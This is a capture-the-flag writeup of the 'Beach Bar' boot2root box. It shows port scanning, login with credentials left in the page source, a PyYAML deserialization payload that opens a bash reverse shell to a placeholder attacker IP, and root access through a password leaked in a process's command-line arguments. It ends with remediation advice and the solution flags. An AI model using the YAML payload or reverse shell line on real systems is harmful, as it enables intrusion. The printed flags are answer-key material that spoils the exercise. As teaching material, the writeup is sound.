# Beach Bar — Boot2Root Writeup

**Author:** Obito Uchiha — Team AKATSUKI **Category:** Boot2Root (Web) **Difficulty:** Easy **Points:** 60 **Target:** `10.49.154.141` **Event:** Hacker Holidays — The Byte Lotus Hotel

---

## 1. Reconnaissance

### 1.1 Port Scanning

```bash
# Full TCP scan
nmap -p- -sS --min-rate 1000 10.49.154.141

# Top UDP scan
nmap -sU -sV --top-ports 100 10.49.154.141
```

**Results:**

|Port|State|Service|
|---|---|---|
|22/tcp|open|ssh|
|80/tcp|open|http|

No other TCP ports open, and the UDP scan returned nothing of interest (only `dhcpc` filtered). This narrowed the attack surface to the web application on port 80.

### 1.2 Web Enumeration

Browsing to the target on port 80 presented a login page for a "Beach Bar" guest jukebox application. Viewing the page source revealed hardcoded credentials left in the login page:

```
dj:dj
```

Logging in with `dj:dj` granted access to a dashboard with three functions:

- **Floor** (dashboard)
- **Import** — upload or paste a playlist in YAML format
- **Export** — download a sample playlist as YAML

---

## 2. Vulnerability Analysis

### 2.1 Identifying the Sink

The **Export** feature returned a sample YAML playlist, confirming the backend parses YAML. The **Import** feature accepted either a pasted YAML blob or an uploaded `.yml` file.

An initial probe with a template-style payload (`{{7*7}}`) in the playlist textarea did not trigger SSTI, but it did trigger a YAML parser error that leaked backend behavior:

```
Could not load playlist: while constructing a mapping
  in "<unicode string>", line 1, column 1:
    {{7*7}}
    ^
found unhashable key
```

This confirmed the backend was feeding user input directly into a YAML loader rather than treating it as a plain string — a strong signal for unsafe deserialization.

### 2.2 Root Cause in Source

After gaining initial shell access (see §3), the Flask source at `/opt/beach-bar/webapp/app.py` confirmed the vulnerability directly:

```python
@app.route("/import", methods=["GET", "POST"])
@login_required
def import_playlist():
    ...
    content = request.form.get("playlist", "")
    if "playlist_file" in request.files:
        f = request.files["playlist_file"]
        if f and f.filename:
            content = f.read().decode("utf-8", "replace")
    try:
        parsed = yaml.load(content, Loader=yaml.Loader)
        result = parsed
    except Exception as e:
        error = f"Could not load playlist: {e}"
    return render_template("import.html", result=result, error=error)
```

The application uses `yaml.load(content, Loader=yaml.Loader)` instead of `yaml.safe_load()`. PyYAML's full `Loader` supports Python-specific tags such as `!!python/object/apply`, which can be abused to instantiate arbitrary Python objects and invoke arbitrary functions during deserialization — a well-known RCE primitive (CWE-502: Deserialization of Untrusted Data).

---

## 3. Exploitation

### 3.1 Gaining a Foothold (YAML Deserialization RCE)

A reverse shell listener was started locally:

```bash
nc -lnvp 5555
```

The following YAML payload was submitted via the **Import** playlist form:

```yaml
!!python/object/apply:subprocess.check_output
  - ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1"]
```

On submission, PyYAML's `Loader` constructed the tagged object, which invoked `subprocess.check_output()` with the reverse shell command — executing it server-side.

**Result:** a connection was received on the listener as the `bartender` user, matching the Gunicorn worker's dropped-privilege identity (`gunicorn -w 2 -b 0.0.0.0:80 --user bartender --group bartender app:app`).

```
bartender@tryhackme-2404:/opt/beach-bar/webapp$
```

### 3.2 User Flag

```bash
cd /home/bartender
cat user.txt
```

```
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

### 3.3 Privilege Escalation — Credential Reuse via Exposed CLI Argument

Standard checks (`sudo -l`, SUID binaries, writable root-owned files, cron jobs) yielded no direct escalation path — `sudo` required a password that was not known, and no SUID/cron misconfigurations were present.

Reviewing the running process list surfaced a root-owned service with its credentials exposed in the command line itself:

```bash
ps aux | grep -v grep | grep -E "root|python|flask"
```

```
root  606  ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

The `jukeboxd.py` script (source below) is a benign-looking "now playing" streamer, launched as **root** with a `--stream-pass` argument. Because process arguments are world-readable via `/proc/<pid>/cmdline` (and thus visible in `ps aux`), this leaked the plaintext string `SunsetSpritz2024!` to any local user.

```python
#!/usr/bin/env python3
import argparse
import time

NOW_PLAYING = [...]

def main():
    parser = argparse.ArgumentParser(description="Beach Bar jukebox streamer")
    parser.add_argument("--stream-pass", required=True, help="stream backend password")
    parser.add_argument("--bitrate", default="320k")
    args = parser.parse_args()
    ...
```

The leaked value was tested directly against the `root` system account:

```bash
su root
Password: SunsetSpritz2024!
```

The password had been reused as the actual `root` login password on the box.

### 3.4 Root Flag

```bash
cd /root
cat root.txt
```

```
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

## 4. Root Cause Summary

|#|Weakness|Impact|
|---|---|---|
|1|`yaml.load(content, Loader=yaml.Loader)` on untrusted input|Remote code execution as the web app user (`bartender`) via crafted YAML tags|
|2|Sensitive credential (`--stream-pass`) passed as a CLI argument to a root process|Local users can read the plaintext secret from `ps aux` / `/proc/<pid>/cmdline`|
|3|Password reuse — the leaked streaming password was also the `root` account password|Trivial privilege escalation once the secret was exposed|

Chained together: an unauthenticated-adjacent web RCE (behind a trivially-guessable/leaked login) led to a low-privilege shell, and passive process enumeration led directly to root — no exotic exploit primitives required at any stage.

---

## 5. Remediation

1. **Never use `yaml.load()` with the default/full `Loader` on untrusted input.** Use `yaml.safe_load()`, which restricts construction to basic Python types and cannot instantiate arbitrary objects.
2. **Never pass secrets via command-line arguments.** Use environment variables, a restricted-permission secrets file, or a secrets manager — CLI args are visible to any local user via `/proc/<pid>/cmdline` or `ps aux`.
3. **Enforce unique credentials per service/account.** The streaming backend password should never double as a system account password.
4. **Don't leave credentials in page source** (the `dj:dj` login was recoverable simply by viewing the HTML).
5. Apply least-privilege consistently — the app already dropped Gunicorn workers to an unprivileged `bartender` user, which correctly contained the initial RCE; the same discipline should extend to how the `jukeboxd` service handles its secrets.

---

## 6. Flags

|Flag|Value|
|---|---|
|User|`THM{y4ml_pl4yl1st_pwns_th3_b34ch}`|
|Root|`THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}`|